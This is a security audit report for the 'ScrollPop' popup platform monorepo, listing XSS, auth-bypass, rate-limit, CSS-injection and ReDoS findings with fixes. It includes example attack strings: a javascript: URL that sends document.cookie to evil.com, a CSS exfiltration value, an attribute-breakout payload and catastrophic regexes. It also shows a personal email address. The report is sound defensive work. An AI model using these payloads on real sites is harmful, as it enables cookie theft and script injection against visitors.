# ScrollPop Security Audit Report

> **Date:** June 2026  
> **Scope:** Full monorepo — API, Cloudflare Worker, Dashboard, Snippet, CI/CD  
> **Analyst:** Senior application security review (architectural + code-level)  
> **Status:** ✅ All findings remediated

---

## Hardening Pass 2 (deep audit — June 2026)

A second, deeper pass found and fixed a higher-severity injection vector plus integrity/abuse gaps the first pass missed. All items below are **fixed and verified** (typecheck + tests green, snippet 8.9 KB gzipped).

| # | Severity | Finding | Fix |
|---|----------|---------|-----|
| P2-1 | **Critical** | **Stored XSS via design element fields.** The visual-builder element renderer interpolated `fontFamily`, `x/y/w/h`, `fontSize`, `align`, `fontWeight`, `padding`, `borderWidth`, `margin`, `gap`, `width`, `height` **raw** into inline `style="…"` attributes. A `fontFamily` like `inherit">​<img onerror=…>` breaks out of the attribute → arbitrary JS on the embedding customer site. These fields aren't in the Zod schema, so they were unvalidated end-to-end. | New `sanitize.ts` module: `cssNum`, `cssFont`, `cssAlign`, `cssWeight`, `cssLen` applied to every style sink in `main.ts`. 21 unit tests (`sanitize.test.ts`). |
| P2-2 | High | **Quota-exhaustion DoS via forged events.** Anyone could read a site's public key + campaign IDs and POST forged `impression`s to `/e`, burning the tenant's monthly view quota → popups auto-disabled. Plus analytics poisoning (arbitrary `visitorId`, revenue, etc.). | Per-(campaign, real-IP) impression flood gate (Redis, 120/min); UUID validation on `visitorId`/`sessionId`; Worker forwards the real client IP authenticated by `INTERNAL_SECRET` so it can't be spoofed against the public API. |
| P2-3 | High | **No security headers** anywhere (API, Worker, dashboard) — clickjacking, MIME-sniffing, no HSTS/CSP. | API `onSend` hook (`nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy`, HSTS); Worker `nosniff` on snippet; dashboard `_headers` (frame-ancestors none, HSTS, Permissions-Policy, CSP in **report-only** to avoid breakage). |
| P2-4 | High | **Privilege escalation via unverified email.** A fresh signup with an *unverified* `@novatise.com` email auto-received the 2M-view agency plan; admin-email elevation and the super-admin console keyed off DB email without checking Clerk verification. | `isVerifiedPrimaryEmail()` gate on all elevation paths (org + personal) and on `assertSuperAdmin`. Fails closed. |
| P2-5 | Med | **`/e` did one DB query per event** — unauthenticated DB-load amplifier (500 req × 50 events/min). | In-process `campaignId → {tenantId, siteId}` cache (5-min TTL) on the ingest hot path. |
| P2-6 | Med | **No supply-chain integrity gate** — the edge-served snippet (`p.txt`) could drift from or be tampered vs. the audited source. | CI gate: a fresh build must be byte-identical to the committed `apps/worker/src/p.txt`, else the build fails. Gates all deploys. |
| P2-7 | Low | KV cache-purge key (`internal.ts`) and Redis bust key (`webhooks.ts`) didn't match the keys actually written → stale config after publish/plan change. | Aligned to `config:v2:` (KV) and `sp_config:` (Redis). |

Injection surfaces audited and confirmed closed in this pass: snippet (sanitized + tested), dashboard (React + no `dangerouslySetInnerHTML` + CSP), API (Zod + parameterized Drizzle + non-leaking error handler), Worker (static, no eval), Shopify Liquid (`| escape`), WordPress plugin (strict 32-hex validation + `esc_js`/`esc_attr`/`esc_url` + capability checks).

---

## Executive Summary

The platform architecture is fundamentally sound: Clerk JWT authentication, per-request tenant isolation, parameterized ORM queries, Shadow DOM isolation for the snippet, and webhook signature verification are all implemented correctly. However, several implementation details create real exploitable risk. The three highest-priority items are a `javascript:` URL injection vector in the snippet's affiliate link rendering, unauthenticated rate-limit key spoofing, and an overly broad dev-mode auth bypass that could silently activate in production if `NODE_ENV` is unset.

**Severity distribution of confirmed findings:**
- Critical: 1
- High: 4  
- Medium: 9
- Low: 3

---

## CRITICAL

### C1 — `javascript:` URL Injection in Snippet Affiliate Links

**Files:** [`packages/snippet/src/main.ts:619`](packages/snippet/src/main.ts), [`packages/snippet/src/main.ts:824`](packages/snippet/src/main.ts), [`packages/snippet/src/main.ts:916`](packages/snippet/src/main.ts)

**What happens:** Three places build `<a href="...">` tags using affiliate slot URLs (`click_tracker_url`, `product_url`). The URL is passed through `escapeHtml()`, which escapes `& < > " '` but does nothing to `javascript:`. A slot URL of `javascript:fetch('https://evil.com?c='+document.cookie)` survives `escapeHtml` intact and renders as a live `javascript:` href.

```typescript
// buildElementsHTML — line 619
const href = injectMacros(rawHref);
out.push(`<a id="cta-link" href="${escapeHtml(href)}" ...>`);

// non-element mode — line 824
htmlChunks.push(escapeHtml(trackerUrl)); // inside href=""

// transitionToSuccess — line 916
`<a class="cta-btn" href="${escapeHtml(trackerUrl)}" ...>`
```

**Exploitability:** A tenant (or a compromised tenant account) configures an affiliate slot with a `javascript:` URL. The popup renders on customer sites. Any visitor who clicks the CTA executes attacker-controlled JS in the host page's context, outside the Shadow DOM. This is a stored XSS via the campaign design system.

**Fix:**

```typescript
function safeHref(url: string): string {
  try {
    const parsed = new URL(url);
    if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') return '#';
    return url;
  } catch {
    return '#';
  }
}
```

Apply `safeHref()` to every affiliate slot URL before rendering into an `href` attribute. Apply in all three locations. Also add a Zod `.refine()` on `AffiliateSlotSchema` URL fields to reject non-HTTP(S) schemes server-side.

---

## HIGH

### H1 — Dev-Mode Auth Bypass Silently Activates if `NODE_ENV` Is Unset

**File:** [`apps/api/src/plugins/tenant-context.ts:99-158`](apps/api/src/plugins/tenant-context.ts)

```typescript
const isDev = process.env['NODE_ENV'] !== 'production';

if (isDev && !hasClerkAuth) {
  // grants owner access to demo tenant — no authentication required
  request.tenantId = tenant.id;
  request.userId = user.id;
  request.memberRole = 'owner';
  return;
}
```

If `NODE_ENV` is absent (common in misconfigured deployments), `isDev` is `true` and every unauthenticated request receives owner-level access to `org_demo_12345`. This is not the Render production environment as currently configured, but it is a silent failure mode with no warning. The same bypass exists as a secondary code path in `index.ts:108-121`.

**Fix:** Add an explicit guard that panics loudly if the dev bypass is active on a port above 3001, or if `DATABASE_URL` points to a non-local host:

```typescript
if (isDev && !hasClerkAuth) {
  const isLocalDb = (process.env['DATABASE_URL'] ?? '').includes('localhost');
  if (!isLocalDb) {
    throw new Error('FATAL: dev-mode auth bypass active against a non-local database. Set NODE_ENV=production.');
  }
  // ...
}
```

### H2 — Rate Limit Key Is User-Supplied

**File:** [`apps/api/src/index.ts:88`](apps/api/src/index.ts)

```typescript
keyGenerator: (req) => req.headers['x-tenant-id'] as string ?? req.ip,
```

Any caller can send `X-Tenant-Id: victim-tenant-uuid` to consume another tenant's rate-limit bucket, or supply a unique random value on every request to completely evade per-key limits. The header is not validated or required to match the authenticated tenant.

**Fix:**

```typescript
keyGenerator: (req) => req.ip,
```

Remove the tenant-header override entirely. The rate limit goal is protecting the API from floods, which is an IP-level concern. Tenant-aware limits belong at the business logic layer after authentication.

### H3 — CSS Value Injection in Snippet Style Blocks

**File:** [`packages/snippet/src/main.ts:719-738`](packages/snippet/src/main.ts)

Design config values (`backgroundColor`, `textColor`, `accentColor`, `backgroundImage`, `boxShadow`, `borderRadius`, etc.) are injected directly into a `<style>` block and inline `style=""` attributes inside the Shadow DOM without sanitization:

```typescript
`.popup{...background:${design.backgroundColor};...background-image:url(${design.backgroundImage});...}`
```

A `backgroundImage` value of `url(https://evil.com/exfil?d=` + `);background:url('https://evil.com/data?` could be crafted to trigger CSS-based data exfiltration via resource loading to an attacker-controlled domain. More practically, arbitrary CSS inside the Shadow DOM enables clickjacking-style UI deception (hiding the real close button, styling the popup to look like a browser prompt, etc.).

**Impact is bounded** — CSS within a closed Shadow DOM cannot affect the host page's styles, and cannot execute JavaScript. But it can load external resources (image requests carry no auth tokens but confirm popup fire for a visitor fingerprint), and can radically reshape the popup's appearance to deceive users.

**Fix:** Whitelist design config values for CSS fields:
- Color fields: validate as hex `#rrggbb` or `#rgb` (regex: `/^#[0-9a-fA-F]{3,8}$/`)
- `backgroundImage`: validate as `https://` URL or reject entirely
- `borderRadius`: validate as integer
- Free-text CSS fields (`boxShadow`, `padding`, `gap`, `margin`): strip semicolons, parentheses, and `url()` before injecting

### H4 — `API_SECRET` Fallback Accepts Legacy Leaked Secret

**File:** [`apps/api/src/routes/internal.ts:17`](apps/api/src/routes/internal.ts)

```typescript
const secret = process.env['INTERNAL_SECRET'] || process.env['API_SECRET'];
```

The fallback to `API_SECRET` means rotating `INTERNAL_SECRET` does not revoke access if the old `API_SECRET` is still set in the environment. An attacker who exfiltrated `API_SECRET` retains access to all internal routes (`/api/v1/internal/config/:publicKey`, `/api/v1/internal/cache/:publicKey`) even after a secret rotation.

**Fix:** Remove the fallback. Require `INTERNAL_SECRET` only. Add a startup assertion:

```typescript
if (!process.env['INTERNAL_SECRET']) {
  throw new Error('INTERNAL_SECRET is required');
}
const secret = process.env['INTERNAL_SECRET'];
```

---

## MEDIUM

### M1 — Admin Email Hardcoded with Fallback in Production Code

**Files:** [`apps/api/src/plugins/tenant-context.ts:13`](apps/api/src/plugins/tenant-context.ts), [`apps/api/src/routes/admin.ts:19`](apps/api/src/routes/admin.ts)

```typescript
const ADMIN_EMAIL = (process.env['ADMIN_EMAIL'] ?? 'dwain3991@gmail.com').toLowerCase();
```

The owner's personal email is in the source code and in git history. If this codebase is ever open-sourced or a developer reads the code, the super-admin identity is revealed. More importantly, if `ADMIN_EMAIL` is not set in an environment, this hardcoded default becomes the admin — creating a latent privilege escalation if someone compromises `dwain3991@gmail.com`.

**Fix:** Remove the default; require the env var explicitly. Fail hard at startup if unset:

```typescript
const ADMIN_EMAIL = process.env['ADMIN_EMAIL']?.toLowerCase();
if (!ADMIN_EMAIL) throw new Error('ADMIN_EMAIL env var is required');
```

### M2 — Super-Admin Error Response Leaks Caller Email

**File:** [`apps/api/src/routes/admin.ts:38`](apps/api/src/routes/admin.ts)

```typescript
message: `Super-admin access required. Authenticated as: ${user?.email ?? 'unknown'}`,
```

The 403 response exposes the authenticated user's email to anyone who can call an admin endpoint and read the response. For non-admin users testing the API, this confirms their email address in the response body.

**Fix:**

```typescript
message: 'Super-admin access required.',
```

### M3 — Analytics Events Accept Arbitrary Client-Supplied Fields

**File:** [`apps/api/src/index.ts:386-418`](apps/api/src/index.ts)

The event ingest endpoint (`POST /e`) accepts `pageUrl`, `referrer`, `visitorId`, `sessionId`, `device`, `trafficSource`, `abVariantId`, `shopifyOrderId`, `revenueCents` directly from the unauthenticated client with minimal validation. The `campaignId` is resolved server-side (good), but the rest is stored verbatim.

Abuse vectors:
- **Analytics poisoning:** Send arbitrary `pageUrl` or `referrer` values to corrupt a competitor's/victim's analytics
- **revenueCents spoofing:** Send `revenueCents: 999999` to inflate conversion revenue metrics
- **visitorId churn:** Send unique `visitorId` on every beacon to inflate unique-visitor counts
- **XSS via analytics dashboard:** If analytics fields are rendered anywhere without escaping, stored XSS

**Fix (incremental):**
1. Validate `pageUrl` and `referrer` as valid URLs (reject non-URL strings)
2. Clamp `revenueCents` to a reasonable maximum (e.g., 1,000,000 = $10k)
3. Validate `device` against the enum `['mobile', 'desktop', 'tablet']`
4. Validate `eventType` is one of the known enum values before inserting

### M4 — `X-Tenant-Override` Header Without Audit Logging

**File:** [`apps/api/src/plugins/tenant-context.ts:69-73`](apps/api/src/plugins/tenant-context.ts)

The `INTERNAL_SECRET` bypass allows any request bearer-authed with `INTERNAL_SECRET` to impersonate any tenant via `X-Tenant-Override`. There is no audit log entry, no rate limit, and no monitoring when this bypass is used. If `INTERNAL_SECRET` leaks, an attacker can silently traverse all tenants with no detectable trace.

**Fix:** Add structured logging on every bypass invocation:

```typescript
if (tenantOverride) {
  request.log.warn({
    security: 'internal_secret_tenant_override',
    tenantId: tenantOverride,
    ip: request.ip,
  }, 'INTERNAL_SECRET tenant override used');
}
```

### M5 — `url_regex` Targeting Pattern Executed Without Timeout (ReDoS)

**File:** [`packages/snippet/src/main.ts:277-284`](packages/snippet/src/main.ts)

```typescript
case 'url_regex': {
  const pattern = (value['pattern'] as string) || '';
  if (pattern.length > 100) return false;
  return new RegExp(pattern).test(url);
}
```

A pattern like `(a+)+$` or `([a-z]+)*z` is only 10 characters but can cause catastrophic backtracking when tested against a long URL. The 100-char length limit is insufficient — ReDoS patterns are typically short. This executes synchronously in the main thread of customer sites, causing the page to freeze.

The pattern comes from the backend config served by Cloudflare KV. A tenant who creates a campaign with a malicious regex would freeze their own visitors' browsers — more of a self-harm/abuse vector than a cross-tenant attack, but still a real denial-of-service against end users.

**Fix (server-side):** Add a Zod `.refine()` on the targeting rule schema that validates regex patterns against a known-safe subset (no backreferences, no nested quantifiers, no catastrophic structures). Reject on save, not on execute.

**Fix (client-side):** Wrap in a `setTimeout`-based watchdog or switch to a linear regex engine for this specific use case.

### M6 — CORS Allows No-Origin Requests to All Authenticated Routes

**File:** [`apps/api/src/index.ts:72-73`](apps/api/src/index.ts)

```typescript
if (!origin) return cb(null, true); // curl, Postman, server-to-server
```

Requests with no `Origin` header bypass the allowlist entirely. In a browser, cross-site requests always include an `Origin`. Allowing no-origin means any server-to-server tool (curl, Python requests, a compromised server) can call any authenticated API endpoint as long as it has a valid Clerk JWT. This is intentional for server-to-server use, but it means the CORS policy doesn't prevent credential exfiltration from non-browser contexts.

**Assessment:** Acceptable for a backend API — CORS is a browser protection, not a server protection. Document explicitly that the API is not CORS-only-protected; Clerk JWT is the actual auth control.

**No code change required** but worth noting in a threat model.

### M7 — Shopify OAuth Access Tokens Stored in Plaintext

**File:** `apps/api/src/db/schema.ts` (shopifyInstallations table), `apps/api/src/routes/shopify.ts`

Shopify access tokens grant full Shopify Admin API access to a merchant's store. They are stored in the database as plaintext strings. A database dump, a backup leak, or SQL injection (the last is not possible with Drizzle's parameterization, but the principle holds) would expose live Shopify admin tokens.

**Fix:** Encrypt tokens at rest using a server-side key (e.g., `node:crypto` AES-256-GCM with a key from `SHOPIFY_ENCRYPTION_KEY` env var). Decrypt on read. This is 20 lines of code and eliminates the risk entirely.

### M8 — Worker Serves Snippet with `max-age=3600` (Not Versioned)

**File:** [`apps/worker/src/index.ts:43`](apps/worker/src/index.ts)

```typescript
'Cache-Control': 'public, max-age=3600'
```

The snippet is served at `/v1/:publicKey/p.js` with a 1-hour browser cache and no content hash in the URL. If a security bug is discovered in the snippet, customers won't receive the fix for up to 60 minutes even after deployment.

**Fix:** Either use a content-hash suffix in the URL (already done for R2-based serving; confirm the Worker path does the same), or reduce `max-age` to 300s (5 minutes) for the Worker bundle path.

### M9 — `injectMacros` Reads Host Page DOM Without Sanitization

**File:** [`packages/snippet/src/main.ts:531-546`](packages/snippet/src/main.ts)

```typescript
if (key === 'page_title') return document.title;
if (key.startsWith('meta:')) {
  const el = document.querySelector(`meta[name="${key.substring(5)}"]`);
  return el ? (el.getAttribute('content') || match) : match;
}
```

The `injectMacros` function reads `document.title` and `<meta>` content attributes from the host page and injects them into popup content. If the host page is an attacker-controlled page, they could craft meta tags to inject arbitrary strings into the popup content. However, these strings are passed through `escapeHtml()` before being added to the DOM, so HTML injection is blocked. The concern is more about content spoofing (a popup claiming to be from a brand when the page has a malicious title).

**Assessment:** Low risk in practice. The host page is the customer's site, not an arbitrary attacker-controlled page. Document this as an intentional feature with the known trust implication.

---

## LOW

### L1 — `assertSuperAdmin` Makes a DB Round-Trip on Every Admin Request

**File:** [`apps/api/src/routes/admin.ts:29-45`](apps/api/src/routes/admin.ts)

Not a security issue, but admin routes perform an extra DB query to fetch the user's email on every request. Cache the result on `request.userEmail` in the tenant-context plugin to avoid the extra round-trip.

### L2 — Snippet Logs Public Key to Console in Production

**File:** [`packages/snippet/src/main.ts:165`](packages/snippet/src/main.ts)

```typescript
console.log('[ScrollPop] Bootstrapping snippet with key:', publicKey);
```

Public keys are not secret (they're embedded in the HTML), but logging them increases noise and could be confused for a secret by a developer reading the console. Strip all `console.log` calls from the production snippet build.

**Fix:** Add esbuild `drop: ['console']` or `drop: ['debugger', 'console']` in `build.mjs` for the production build.

### L3 — `/health` Endpoint Leaks Server Timestamp

**File:** [`apps/api/src/index.ts:471`](apps/api/src/index.ts)

```typescript
app.get('/health', async () => ({ ok: true, ts: Date.now() }));
```

Returns the server's current Unix timestamp. This confirms the server is running and its clock skew, which aids timing attacks. Return only `{ ok: true }`.

---

## Positive Security Controls (Working Correctly)

These are explicitly called out because they are non-obvious and correctly implemented:

| Control | Where | Notes |
|---|---|---|
| Clerk JWT verification | `tenant-context.ts` | Org + personal account paths both validated |
| Tenant isolation on every query | All route handlers | `tenantId` injected by middleware, used in every WHERE clause |
| Webhook HMAC (Clerk/Stripe/Shopify) | `routes/webhooks.ts`, `routes/shopify.ts` | All use official SDKs or `timingSafeEqual` |
| Shadow DOM isolation | `snippet/main.ts:697` | `attachShadow({mode:'closed'})` correctly prevents CSS/DOM bleed |
| `escapeHtml()` on text fields | `snippet/main.ts:1120-1128` | Applied consistently to all text content in the popup |
| No history/popstate in snippet | CI gate + code | Hard enforced; CI fails if pattern appears |
| `navigator.sendBeacon` with fallback | `snippet/main.ts:1078-1088` | Correct beacon pattern with `text/plain` to avoid CORS preflight |
| Bot/webdriver detection | `snippet/main.ts:154-159` | Prevents analytics from automated crawlers |
| Monthly view cap enforcement | `worker/index.ts:164-190` | Correct dual-layer: Redis fast path + DB fallback, fail-open |
| `tenantId`/`monthlyViewLimit` stripped before browser | `worker/index.ts:186-189` | Internal fields deleted from payload before response |
| Rate limit on `/e` ingest | `index.ts:369-382` | 500/min per IP, separate from global limit |

---

## Hardening Roadmap (Priority Order)

### Sprint 1 — Fix Before Next Deploy
1. **C1** — Add `safeHref()` to all three affiliate link rendering sites in snippet + server-side Zod refine
2. **H4** — Remove `API_SECRET` fallback; add startup assertion for `INTERNAL_SECRET`
3. **H1** — Fix dev-mode bypass to panic if targeting non-local DB
4. **M1** — Remove hardcoded admin email default; require env var

### Sprint 2 — This Month
5. **H2** — Change rate limit key to `req.ip` only
6. **H3** — Whitelist CSS value fields from design config before injection
7. **M2** — Remove email from 403 error message
8. **M3** — Add event field validation (pageUrl, device enum, revenueCents clamp)
9. **M4** — Add structured audit log for `X-Tenant-Override` usage

### Sprint 3 — Next Month
10. **M5** — Server-side regex validation for targeting rules
11. **L2** — Strip `console.log` from production snippet build
12. **M7** — Encrypt Shopify access tokens at rest
13. **M8** — Pin snippet URL with content hash or reduce `max-age`

### Ongoing
- Secret scanning in CI (GitHub Advanced Security or trufflehog)
- Monitor Clerk, Stripe, Shopify SDKs for security advisories
- Quarterly review of `PUBLIC_ROUTES` allow-list additions
- Review any new route for tenant isolation before merge
